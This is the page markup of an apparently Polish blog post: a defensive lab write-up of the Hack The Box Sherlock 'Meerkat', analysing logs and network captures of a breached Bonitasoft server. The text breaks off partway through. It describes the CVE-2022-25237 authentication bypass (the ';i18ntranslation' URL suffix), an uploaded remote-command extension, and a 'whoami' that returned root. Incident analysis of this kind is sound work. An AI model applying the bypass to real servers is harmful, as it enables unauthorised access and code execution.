@@ -1,0 +1,1460 @@
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="false"><head><script src="/CyberZgroza/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=CyberZgroza/livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>Hack The Box Sherlock - meerkat &middot; </title>
+  <meta name="title" content="Hack The Box Sherlock - meerkat &middot; " />
+  
+  <meta name="description" content="Analiza Sherlocka &#34;Meerkat&#34; z HTB" />
+  <meta name="keywords" content="blueteam, siem, homelab, " />
+  
+  
+  <link rel="canonical" href="http://localhost:1313/CyberZgroza/posts/htb_sherlock_meerkat/" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/CyberZgroza/css/main.bundle.min.bb11319fc7f93e4c214d6df923be29dfbdf8003662fb2d8c9610e1783cadeafc1b81620d9df3a50a4de1098d328c5f3699c958c73af1bad46c6020c363147d00.css"
+    integrity="sha512-uxExn8f5PkwhTW35I74p3734ADZi&#43;y2MlhDheDyt6vwbgWINnfOlCk3hCY0yjF82mclYxzrxutRsYCDDYxR9AA==" />
+  
+  
+  <script type="text/javascript" src="/CyberZgroza/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/CyberZgroza/js/main.bundle.min.8c6b3c661facf9b6476acd8dd62042eee456bb8466da5e715de2615b7f7544c3ebef1d23c8d7c36c3863e61a7924ebfb1453d01b6ddb5779aa25effb4c331c8c.js"
+    integrity="sha512-jGs8Zh&#43;s&#43;bZHas2N1iBC7uRWu4Rm2l5xXeJhW391RMPr7x0jyNfDbDhj5hp5JOv7FFPQG23bV3mqJe/7TDMcjA==" data-copy="Copy" data-copied="Copied"></script>
+  
+  
+  
+  <script src="/CyberZgroza/lib/zoom/zoom.min.3530c2657381259433194af312ec3d322a97a2ad85661810299757fe793b24c3b8e07ab97fa8e5cf96cff1208f271e75394b6eaa56c2e39e7e2c3ca49fb1921c.js" integrity="sha512-NTDCZXOBJZQzGUrzEuw9MiqXoq2FZhgQKZdX/nk7JMO44Hq5f6jlz5bP8SCPJx51OUtuqlbC455&#43;LDykn7GSHA=="></script>
+  
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/CyberZgroza/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/CyberZgroza/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/CyberZgroza/favicon-16x16.png" />
+  <link rel="manifest" href="/CyberZgroza/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="http://localhost:1313/CyberZgroza/posts/htb_sherlock_meerkat/">
+  <meta property="og:title" content="Hack The Box Sherlock - meerkat">
+  <meta property="og:description" content="Analiza Sherlocka “Meerkat” z HTB">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-09-15T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-09-15T00:00:00+00:00">
+    <meta property="article:tag" content="Blueteam">
+    <meta property="article:tag" content="Siem">
+    <meta property="article:tag" content="Homelab">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hack The Box Sherlock - meerkat">
+  <meta name="twitter:description" content="Analiza Sherlocka “Meerkat” z HTB">
+
+    
+  
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "Hack The Box Sherlock - meerkat",
+    "headline": "Hack The Box Sherlock - meerkat",
+    
+    "abstract": "Analiza Sherlocka \u0026ldquo;Meerkat\u0026rdquo; z HTB",
+    "inLanguage": "en",
+    "url" : "http:\/\/localhost:1313\/CyberZgroza\/posts\/htb_sherlock_meerkat\/",
+    "author" : {
+      "@type": "Person",
+      "name": "CyberZgroza"
+    },
+    "copyrightYear": "2025",
+    "dateCreated": "2025-09-15T00:00:00\u002b00:00",
+    "datePublished": "2025-09-15T00:00:00\u002b00:00",
+    
+    "dateModified": "2025-09-15T00:00:00\u002b00:00",
+    
+    "keywords": ["blueteam","siem","homelab"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1090"
+  }]
+  </script>
+
+
+  
+  
+  <meta name="author" content="CyberZgroza" />
+  
+  
+  
+  
+  <link href="https://github.com/Asttraios" rel="me" />
+  
+  
+  
+  
+  <link href="https://linkedin.com/in/swiderskikrzysztof/" rel="me" />
+  
+  
+  
+  
+  
+
+<script src="/CyberZgroza/lib/jquery/jquery.slim.min.03cb160e3cfdb2667a2e2c80d283bebcf63ff8bbc4b629c9ab2babf6fae1d0c07ad470edae783efa4fabda2ac01c58d60e63b98b3c336be8208460f08f4354f5.js" integrity="sha512-A8sWDjz9smZ6LiyA0oO&#43;vPY/&#43;LvEtinJqyur9vrh0MB61HDtrng&#43;&#43;k&#43;r2irAHFjWDmO5izwza&#43;gghGDwj0NU9Q=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+  
+  
+  
+  
+  <meta name="theme-color"/>
+  
+  
+
+  
+  
+</head>
+<body
+    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a
+      >
+    </div>
+    
+    
+      <div class="min-h-[148px]"></div>
+<div
+  class="fixed inset-x-0 min-h-[130px] opacity-65 pl-[24px] pr-[24px] bg-gradient-to-b from-neutral from-60% dark:from-neutral-800 to-transparent mix-blend-normal z-index-80"></div>
+<div class="fixed inset-x-0 pl-[24px] pr-[24px] z-index-100">
+  <div
+    id="menu-blur"
+    class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl"></div>
+  <div class="relative max-w-[64rem] ml-auto mr-auto">
+    <div class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 padding-main-menu">
+    
+    
+    
+    <div>
+        <a href="/CyberZgroza/" class="flex">
+            <span class="sr-only"></span>
+
+            
+            <img src="/CyberZgroza/img/cyberzgroza_logo_tekst_bez_tla_256.png" width="128" height="128"
+                class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt="" />
+            
+
+        </a>
+    </div>
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            
+            <a href="/CyberZgroza/" class="text-base font-medium text-gray-500 hover:text-gray-900"></a>
+            
+
+        </nav>
+        <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
+
+            
+            
+            
+  <a
+  href="/CyberZgroza/posts/"
+  
+  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="Posts">
+    Blog
+  </p>
+</a>
+
+
+
+            
+            
+  <a
+  href="/CyberZgroza/about/"
+  
+  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="O blogu słów kilka...">
+    O mnie
+  </p>
+</a>
+
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+
+        </nav>
+        <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+
+        </div>
+    </div>
+    <div class="-my-2 md:hidden">
+
+        <label id="menu-button" class="block">
+            
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 padding-top-[5px]">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li id="menu-close-button">
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+
+                    
+  <li class="mt-1">
+  <a
+    href="/CyberZgroza/posts/"
+    
+    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="Posts">
+      Blog
+    </p>
+  </a>
+</li>
+
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+  <a
+    href="/CyberZgroza/about/"
+    
+    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="O blogu słów kilka...">
+      O mnie
+    </p>
+  </a>
+</li>
+
+
+
+
+                    
+
+                </ul>
+                
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+
+  </div>
+</div>
+
+
+<script
+  type="text/javascript"
+  src="/CyberZgroza/js/background-blur.min.4812321520cc2e4cd52bf9137015a55bb6c0b5e66a6b2c96b8654c0ec99be59e8e6425dd838a6fd9bac54000586f37f4a9680bbefaa2aee4601a69e188005cf6.js"
+  integrity="sha512-SBIyFSDMLkzVK/kTcBWlW7bAteZqayyWuGVMDsmb5Z6OZCXdg4pv2brFQABYbzf0qWgLvvqiruRgGmnhiABc9g=="
+  data-target-id="menu-blur"></script>
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+
+
+  <article>
+    
+
+
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        Hack The Box Sherlock - meerkat
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2025-09-15T00:00:00&#43;00:00">15 September 2025</time><span class="px-2 text-primary-500">&middot;</span><span>1090 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">6 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+
+  
+  
+
+
+
+      </div>
+
+      
+      
+      
+      
+      
+
+      
+
+      
+
+        
+          
+          
+<div class="flex author">
+  
+    
+    
+      
+    
+    
+      
+        
+      
+      <img
+        class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4"
+        width="96"
+        height="96"
+        alt="CyberZgroza"
+        src="/CyberZgroza/img/cyberzgroza_logo_bez_tla_1024_hu_5f551b6c8415049c.png">
+    
+  
+  <div class="place-self-center">
+    
+      <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+        Author
+      </div>
+      <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+        CyberZgroza
+      </div>
+    
+    
+    <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://github.com/Asttraios"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://linkedin.com/in/swiderskikrzysztof/"
+          target="_blank"
+          aria-label="Linkedin"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+  </div>
+
+</div>
+  </div>
+</div>
+
+        
+
+        
+
+        
+          <div class="mb-5"></div>
+        
+
+      
+
+    </header>
+
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+        <div class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
+          <div
+            class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]
+            
+            ">
+            
+              <details
+  open
+  id="TOCView"
+  class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#pytanie-1">Pytanie 1</a></li>
+    <li><a href="#pytanie-2">Pytanie 2</a></li>
+    <li><a href="#pytanie-3">Pytanie 3</a></li>
+    <li><a href="#pytanie-4">Pytanie 4</a></li>
+    <li><a href="#pytanie-5">Pytanie 5</a></li>
+    <li><a href="#pytanie-6">Pytanie 6</a></li>
+    <li><a href="#pytanie-7">Pytanie 7</a></li>
+    <li><a href="#pytanie-8">Pytanie 8</a></li>
+    <li><a href="#pytanie-9">Pytanie 9</a></li>
+    <li><a href="#pytanie-10">Pytanie 10</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#pytanie-1">Pytanie 1</a></li>
+    <li><a href="#pytanie-2">Pytanie 2</a></li>
+    <li><a href="#pytanie-3">Pytanie 3</a></li>
+    <li><a href="#pytanie-4">Pytanie 4</a></li>
+    <li><a href="#pytanie-5">Pytanie 5</a></li>
+    <li><a href="#pytanie-6">Pytanie 6</a></li>
+    <li><a href="#pytanie-7">Pytanie 7</a></li>
+    <li><a href="#pytanie-8">Pytanie 8</a></li>
+    <li><a href="#pytanie-9">Pytanie 9</a></li>
+    <li><a href="#pytanie-10">Pytanie 10</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+
+            
+            
+          </div>
+        </div>
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+
+
+
+        <div class="article-content max-w-prose mb-20">
+          <p>Kolejny zadanie z DFIR. Mamy przeanalizować logi oraz plik PCAP, czyli zrzut ruchu sieciowego. Scenariusz wygląda następująco:
+<strong><code>As a fast-growing startup, Forela has been utilising a business management platform. Unfortunately, our documentation is scarce, and our administrators aren't the most security aware. As our new security provider we'd like you to have a look at some PCAP and log data we have exported to confirm if we have (or have not) been compromised.</code></strong></p>
+<p>Uruchamiamy maszynę wirtualną Kali Linux i wypakowujemy utworzoną kopię oryginalnego pliku ZIP z dowodami.</p>
+<p><code>unzip meerkat_copy.zip</code></p>
+
+<h2 class="relative group">Pytanie 1 
+    <div id="pytanie-1" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#pytanie-1" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p><strong>We believe our Business Management Platform server has been compromised. Please can you confirm the name of the application running?</strong></p>
+<p>Proszą nas o podanie nazwy aplikacji do zarządzania biznesem, uruchomionej na serwerze. Zacznijmy od pliku <code>meerkat-alerts.json</code>. po otwarciu widzimy, że niska czytelność logów utrudni nam dalszą analizę&hellip;</p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="meerkat_vim_mess"
+    srcset="
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_vim_mess_hu_6b9ebcd62d0264c.png  330w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_vim_mess_hu_70743945bd58d9e0.png  660w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_vim_mess_hu_d1a5558571747b0d.png 1280w
+    "
+    data-zoom-src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_vim_mess.png"
+    src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_vim_mess.png">
+
+  
+</figure>
+</p>
+<p>Skorzystamy z modułu pythona, a konkretnie z json.tool i output zapiszemy w pliku txt.
+<code>python -m json.tool meerkat-alerts.json &gt; meerkat-alerts-clear.txt</code></p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="meerkat_clear_logs"
+    srcset="
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_clear_logs_hu_6522bcc74c34ab04.png  330w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_clear_logs_hu_3a2e1aa4d1c1396b.png  660w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_clear_logs_hu_beaa1b2b5180e58c.png 1280w
+    "
+    data-zoom-src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_clear_logs.png"
+    src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_clear_logs.png">
+
+  
+</figure>
+</p>
+<p>O wiele lepiej. Po krótkiej analizie znajdujemy ciekawy log:</p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="meerkat_cve_log"
+    srcset="
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_cve_log_hu_da0645946d5d42fa.png  330w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_cve_log_hu_a3f3a770f3eca1dc.png  660w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_cve_log_hu_70145ec705ad1084.png 1280w
+    "
+    data-zoom-src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_cve_log.png"
+    src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_cve_log.png">
+
+  
+</figure>
+</p>
+<p>Wygląda na to, że jakieś narzędzie SIEM wykryło próbę zdobycia uprawnień administratora wykorzystując podatność CVE-2022-25237.</p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="meekrat_cve_details"
+    srcset="
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meekrat_cve_details_hu_20db4e9297df3222.png  330w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meekrat_cve_details_hu_cf90cd92e53dd423.png  660w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meekrat_cve_details_hu_97db53a6470156a5.png 1280w
+    "
+    data-zoom-src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meekrat_cve_details.png"
+    src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meekrat_cve_details.png">
+
+  
+</figure>
+</p>
+<p>Wygląda na to, że mamy do czynienia z krytyczną podatnością (CVSS:3.1 9.8) aplikacji Bonitasoft - to open-source platforma do zarządzania biznesem. Podatność polega na dodaniu fragmentu <code>;i18ntranslation</code> na koniec zapytania API w URL. Dzięki temu poprzez aplikację webową Bonita Web, używając domyślnych poświadczeń lub zwykłego użytkownika, jesteśmy w stanie pominąć proces uwierzytelniania i uzyskać dostęp do poufnych endpointów.</p>
+<p>W logach PCAP widzimy dokładny moment wykonania zapytania POST, który uploaduje plik ZIP <code>rce_api_extension.zip</code> - rozszerzenie, które Bonita automatycznie instaluje. Dzięki niemu atakujący ma możliwość wykonania poleceń na serwerze zdalnie. Serwer odpowiada kodem 200, co oznacza że żądanie zostało pomyślnie przetworzone. Widzimy również stringa <code>;i18ntranslation</code>, które pozwoliło ominąć filtr i uniknąć procesu uwierzytelniania.</p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="meerkat_bonita_rce"
+    srcset="
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_bonita_rce_hu_b562828c6e169954.png  330w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_bonita_rce_hu_6076cfe418b2307.png  660w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_bonita_rce_hu_fcb31dba506813ff.png 1280w
+    "
+    data-zoom-src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_bonita_rce.png"
+    src="/CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_bonita_rce.png">
+
+  
+</figure>
+</p>
+<p>Nieco niżej widzimy zapytanie GET. Atakujący wykonał udane zdalne polecenie <code>whoami</code> na serwerze. Zwrócona wartość to <code>root</code>. Nie jest dobrze&hellip;</p>
+<p>
+
+
+
+
+
+
+<figure>
+      <img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="low"
+    alt="meerkat_root_answ"
+    srcset="
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_root_answ_hu_9699371487a93b36.png  330w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_root_answ_hu_3a198bde3cceb261.png  660w,
+      /CyberZgroza/posts/htb_sherlock_meerkat/images/meerkat_root_answ_hu_6dbc55e2af4c357c.png 1280w
+    "
